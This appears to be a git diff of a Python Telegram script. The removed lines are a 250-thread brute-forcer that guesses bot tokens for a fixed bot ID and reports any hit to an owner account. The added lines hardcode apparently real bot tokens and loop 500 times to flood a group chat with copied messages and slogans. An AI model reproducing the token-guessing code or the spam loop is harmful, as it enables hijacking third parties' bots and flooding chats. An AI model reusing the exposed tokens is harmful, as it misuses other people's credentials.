@@ -1,70 +1,42 @@
-import random
-import threading
-from telegram import Bot
-import os,sys
-from pytz import timezone 
-from datetime import datetime
-
-chars ="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
-
-
-THREAD_COUNT = int(os.environ.get("THREADS","250"))
-GROUP_NAME = os.environ.get("GROUP_NAME","Mahabharat").replace("-","_")
-TOKEN=os.environ.get("BOT_TOKEN","Unauthorised")
+from telegram import InlineKeyboardMarkup,InlineKeyboardButton,Bot
+import time
+#https://ucanapplym.s3.amazonaws.com/laraveldemo/PIY0000062/photo/dseu1627367044806366.JPG
+#DSEU000806366100
+TOKEN="1816572959:AAGfMjWNxzDsEBdRp8Ovkkat8eqxNvicCJw"
+chat_id=-1001492870356
+chat_id = -1001557278807
+from_chat=1797416707
 bot=Bot(TOKEN)
-
-OWNER = 834508473
-LOG_GROUP = -1001319740376
-
-START_TIME = datetime.now(timezone("Asia/Kolkata"))
-
-def Log(msg):
-  print(msg)
-  bot.send_message(LOG_GROUP,msg)
-
-Log(f"""
-Server Restart
-No Of Bots : {THREAD_COUNT}
-GROUP NAME : #{GROUP_NAME}
-Current Time: {START_TIME:%Y-%m-%d %H:%M}
-""")
-
-def run(n):
-  ATTEMPT = 0
-  while True:
-    ATTEMPT += 1
-    if ATTEMPT % 5000 == 0:
-      if n == THREAD_COUNT:
-        CURRENT_TIME = datetime.now(timezone("Asia/Kolkata"))
-        TIME_DIFFERENCE = CURRENT_TIME - START_TIME
-        TIME_TAKEN = TIME_DIFFERENCE.total_seconds()/60
-        Log(f"""{ATTEMPT} Attempt Completed by {n} Bots \nBOT_GROUP_NAME: {GROUP_NAME} \nRUNNING FROM {TIME_TAKEN} Minutes""")
-        
-    token = "609517172:AA" + "".join(random.choices(chars,k=33))
-    new_bot = Bot(token)
+#bot2=Bot("1718858814:AAHWjcYiN6VdQ7dplZhPgD7mGMRcQXtGmt8")
+bot2=Bot("1496237028:AAEXDzYf3k1KwkXEpfPi2biRMvONfW9TYkU")
+quotes=[]
+with open("quotes.json","r") as f:
+  import json
+  quotes=json.load(f)
+k=0
+for i in range(500):
+  try:
+    if abs(k-len(quotes))<5:
+      k=0
+    print(bot2.sendMessage(chat_id,"Jai Shree Ram🚩").message_id)
+    print(bot.copyMessage(chat_id,from_chat,4).message_id)
+    print(bot.copyMessage(chat_id,from_chat,5).message_id)
+    print(bot2.sendMessage(chat_id,"Har Har Mahadev 🚩").message_id)
+    print(bot2.sendMessage(chat_id, quotes[k]).message_id)
+    k+=1
+    print(bot.copyMessage(chat_id,from_chat,7).message_id)
+    print(bot.sendMessage(chat_id, quotes[k]).message_id)
+    k+=1
+    print(bot2.sendMessage(chat_id,"Jai Bajrang Bali").message_id)
+  except Exception as e:
     try:
-      username = new_bot.username
-      if username:
-        print(username)
-        print(token)
-        bot.send_message(OWNER,token)
-        Log(username)
-        bot.send_message(OWNER,"😎"*50)
-        Log("#Congratulations")
-        Log("👀"*20)
-        Log(token[11:])
-        sys.exit()
-    except:
-      pass
-    
-
-THREADS = []
-for i in range(THREAD_COUNT):
-  thread = threading.Thread(target=run,args=[i])
-  thread.start()
-  THREADS.append(thread)
-print(len(THREADS))
-  
-for thread in THREADS:
-  thread.join()
-print("Done")
+      print("Error Occurred",e)
+      print(bot2.sendMessage(chat_id, quotes[k]).message_id)
+      k+=1
+      time.sleep(15)
+      print(bot.copyMessage(chat_id,from_chat,2).message_id)
+      print(bot2.sendMessage(chat_id,"Jai Shree Ram🚩").message_id)
+      print(bot.copyMessage(chat_id,from_chat,3).message_id)
+    except Exception as ee:
+      print("Andar Ka Error",ee)
+      time.sleep(30)
